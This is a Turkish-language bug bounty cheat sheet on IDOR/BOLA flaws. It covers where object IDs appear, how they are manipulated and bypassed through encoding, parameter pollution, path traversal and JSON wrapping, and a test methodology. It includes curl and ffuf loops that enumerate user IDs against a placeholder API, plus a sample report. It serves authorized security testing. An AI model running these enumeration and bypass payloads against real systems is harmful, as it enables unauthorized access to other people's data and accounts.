# 🔓 IDOR - Güvensiz Doğrudan Nesne Başvurusu Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Insecure Direct Object Reference (BOLA)
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Yetki_Kontrolü-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Yetkilendirme-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 İçindekiler

- [IDOR Nedir?](#-idor-nedir)
- [Nerede Aranır?](#-nerede-aranır)
- [ID Türleri ve Değer Manipülasyonu](#-id-türleri-ve-değer-manipülasyonu)
- [Atlatma (Bypass) Teknikleri](#-atlatma-bypass-teknikleri)
- [Test Metodolojisi](#-test-metodolojisi)
- [Araçlar ve Otomasyon](#-araçlar-ve-otomasyon)
- [Özet Başvuru ve Raporlama](#-özet-başvuru-ve-raporlama)

---

## 🎯 IDOR Nedir?

**IDOR (Insecure Direct Object Reference)**, bir web uygulamasının veritabanı kayıtları, dosyalar veya sistem nesneleri gibi dahili nesnelere doğrudan erişim sağlayan tanımlayıcıları (ID) istemciye sunması ve bu nesnelere erişimde yetki kontrolü yapmaması durumunda ortaya çıkar.

### Etki Derecesi (Impact)
- 🔴 **Veri Hırsızlığı:** Başka kullanıcıların kişisel ve gizli verilerine erişim
- 🔴 **Yetki Yükseltme:** Yönetici (Admin) işlevlerine ve kayıtlarına yetkisiz erişim
- 🔴 **Hesap Ele Geçirme (ATO):** Başka hesapların profil veya güvenlik ayarlarını değiştirme
- 🔴 **Veri Tahrifatı:** Başka kullanıcılara ait kayıtları silme (DELETE) veya güncelleme (PUT)

### IDOR ve BOLA Farkı
| Terim | Açıklama |
|-------|----------|
| **IDOR** | Geleneksel web uygulama güvenliği terimi |
| **BOLA** | OWASP API Güvenliği terimi (*Broken Object Level Authorization*) |

---

## 🔍 Nerede Aranır?

### URL Parametrelerinde
```
/user/profile?id=123
/api/users/123
/download?file=rapor_123.pdf
/account/settings/123
/orders/view/123
```

### POST / PUT Gövdesinde (JSON)
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### HTTP Başlıklarında (Headers)
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Yaygın ID Parametre İsimleri
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

---

## 🔢 ID Türleri ve Değer Manipülasyonu

### Sıralı (Sequential / Sayısal) ID'ler
En yaygın ve en kolay tespit edilen türdür:
```
# Sadece değeri artırın veya azaltın
/api/users/1
/api/users/2
/api/users/3

# Sınır değerlerini (Edge cases) test edin:
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUID / GUID Yapıları
```
# Gerçekten rastgele mi yoksa sıralı mı olduğunu kontrol edin:
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001

# UUIDv1 (Zaman damgası tabanlı) tahmin edilebilir.
# UUIDv4 (Tam rastgele) brute force için zordur ancak yanıtlarda veya başka API çıktılarında ifşa olabilir.
```

### Kodlanmış (Encoded) ID'ler
```bash
# Base64 ile kodlanmış ID'ler
echo "123" | base64   # MTIz
echo "124" | base64   # MTI0

# URL testi:
/api/users/MTIz  → Çözümlenmiş: 123
/api/users/MTI0  → Çözümlenmiş: 124

# Hex kodlama:
123 → 7b
124 → 7c
```

### Hashlenmiş ID'ler
```
# ID'nin MD5 hash'i:
/user/202cb962ac59075b964b07152d234b70  → md5(123)
```

---

## 🛡️ Atlatma (Bypass) Teknikleri

### Parametre Manipülasyonu
```bash
# Orijinal istek:
GET /api/users/123

# Filtre atlatma denemeleri:
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### HTTP Metodu Değiştirme
```bash
# GET engellenmişse diğer metotları deneyin:
GET /api/users/124     → Engellendi (403)
POST /api/users/124    → Kabul edildi mi?
PUT /api/users/124     → Kabul edildi mi?
```

### Dizi ve Nesne İçine Alma
```json
// Sayısal filtreleme varsa JSON içinde sarma deneyin:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Kodlama ile Atlatma (Encoding Bypass)
```
# URL Encoding:
/api/users/12%34          → 124
/api/users/%31%32%34      → 124

# Çift URL Kodlama (Double Encoding):
/api/users/%2531%2532%2534 → 124

# Unicode:
/api/users/１２４          → Full-width 124
```

### Dizin Gezinimi (Path Traversal) ile Birleştirme
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### HTTP Parametre Kirliliği (HPP)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Test Metodolojisi

### Adım 1: Haritalama
1. Uygulamadaki tüm nesne referanslarını ve ID parametrelerini listeleyin.
2. Sisteme **iki farklı test kullanıcısı** (Kullanıcı A ve Kullanıcı B) açın.

### Adım 2: Karşılaştırma
1. Kullanıcı A olarak oturum açıp kendi nesnelerinizin ID'lerini not edin.
2. Kullanıcı B olarak oturum açıp kendi nesnelerinizin ID'lerini not edin.

### Adım 3: İstismar Testi
1. Kullanıcı A'nın oturum çerezi / JWT token'ı ile Kullanıcı B'nin nesnelerine istek atın.
2. Tüm CRUD işlemlerini test edin:
   - **Okuma:** GET
   - **Oluşturma:** POST
   - **Güncelleme:** PUT / PATCH
   - **Silme:** DELETE

### Adım 4: Yetki Yükseltme Denemesi
1. Yönetici ID'lerini (1, 0, admin) deneyin.
2. Özel değerleri (`null`, `undefined`, `*`) deneyin.

---

## 🛠️ Araçlar ve Otomasyon

### Burp Suite Eklentileri
- **Autorize:** Otomatik IDOR ve yetki atlatma tespit eklentisi.
- **AuthMatrix:** Rol ve izin tabanlı matris denetimi.

#### Autorize Nasıl Kullanılır?
1. Burp BApp Store'dan **Autorize** eklentisini kurun.
2. Kullanıcı B'nin oturum çerezini Autorize paneline yapıştırın.
3. Tarayıcınızda Kullanıcı A olarak normal şekilde gezinin.
4. Autorize arka planda her isteği Kullanıcı B yetkisiyle tekrarlayıp kırmızı/yeşil durum gösterir.

### cURL ile Manuel Test Döngüsü
```bash
# Kullanıcı A token'ı ile ID'leri tarama
for i in {1..100}; do
  curl -s -H "Authorization: Bearer USER_A_TOKEN" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR TESPİT EDİLDİ: $i"
done
```

### FFUF ile IDOR Taraması
```bash
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer USER_A_TOKEN" \
     -w <(seq 1 1000) \
     -mc 200 -fc 403,404
```

---

## 📊 Özet Başvuru ve Raporlama

### Zafiyete En Açık Fonksiyonlar
| Fonksiyon | Risk Seviyesi |
|-----------|---------------|
| Profil / Hesap İnceleme | Kişisel veri sızıntısı |
| Fatura / Belge İndirme | Hassas ticari dosya erişimi |
| Kayıt Silme Fonksiyonları | Veri kaybı (DoS) |
| Ayarları Güncelleme | Hesap ele geçirme (ATO) |
| Sipariş Geçmişi | Gizlilik ihlali |
| Veri Dışa Aktarma (Export CSV/PDF) | Toplu veri hırsızlığı |

### Örnek Rapor Formatı
```markdown
## Başlık: Kullanıcı Profilinde IDOR Zafiyeti

**Uç Nokta:** GET /api/users/{id}

**Adımlar:**
1. Kullanıcı A (ID: 123) olarak giriş yapın.
2. GET /api/users/124 adresine istek gönderin.
3. Yanıtta Kullanıcı B'ye ait özel bilgilerin döndüğünü gözlemleyin.

**Etki:** Yetkili herhangi bir kullanıcı, sistemdeki tüm diğer kullanıcıların kişisel verilerine erişebilmektedir.

**PoC (Kanıt):**
curl -H "Authorization: Bearer [TOKEN_A]" https://api.target.com/users/124
```

---

<p align="center">
  <b>🔓 IDOR Açıklarını Tespit Edin ve Güvenliği Sağlayın!</b><br>
  <i>Yalnızca yasal yetkilendirme kapsamında test yapınız.</i>
</p>
